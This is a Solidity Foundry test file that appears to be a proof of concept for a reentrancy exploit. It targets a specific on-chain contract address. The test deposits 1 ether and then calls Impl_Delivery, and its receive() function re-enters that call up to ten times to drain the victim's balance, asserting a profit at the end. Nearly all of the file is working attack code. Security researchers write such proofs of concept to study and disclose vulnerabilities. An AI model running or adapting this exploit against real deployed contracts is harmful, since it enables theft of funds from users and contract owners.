// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IPeckShieldArche {
    function Impl_Delivery() external;
    function deposit() external payable;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x2815d3272baE3ebde5D7c128Eea5f4A8da402783;
    address attacker = address(this);
    IPeckShieldArche internal victim = IPeckShieldArche(payable(TARGET));
    uint256 reentranceCount = 0;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        deal(TARGET, 10 ether);
        deal(address(this), 1 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        victim.deposit{value: 1 ether}();
        victim.Impl_Delivery();
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH / Re-entrancy Logic ─────────────────────
    receive() external payable {
        // Re-enter the Impl_Delivery function to drain the contract
        if (reentranceCount < 10 && TARGET.balance > 0) {
            reentranceCount++;
            victim.Impl_Delivery();
        }
    }
}

